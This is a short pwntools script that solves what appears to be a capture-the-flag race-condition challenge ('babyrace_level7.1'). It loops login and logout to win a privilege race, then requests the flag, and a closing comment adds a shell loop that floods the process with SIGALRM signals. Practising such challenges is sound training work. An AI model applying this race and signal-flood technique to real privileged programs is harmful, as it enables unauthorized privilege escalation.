from pwn import *

r =  process('/challenge/babyrace_level7.1')
r.recvuntil(b'Privilege level: ')
while True:
    r.sendline(b'login')
    r.recvuntil(b'Privilege level: ')
    r.sendline(b'logout')
    r.recvuntil(b'Privilege level: ', timeout=0.2)
    a = r.recv(1)
    print(a)
    if a != b'0':
        r.sendline(b'win_authed')
        break
r.recvuntil(b'flag:\n')
print(r.recvline())
r.close()



##shell 2 : while /bin/true ; do kill -SIGALRM PID ; done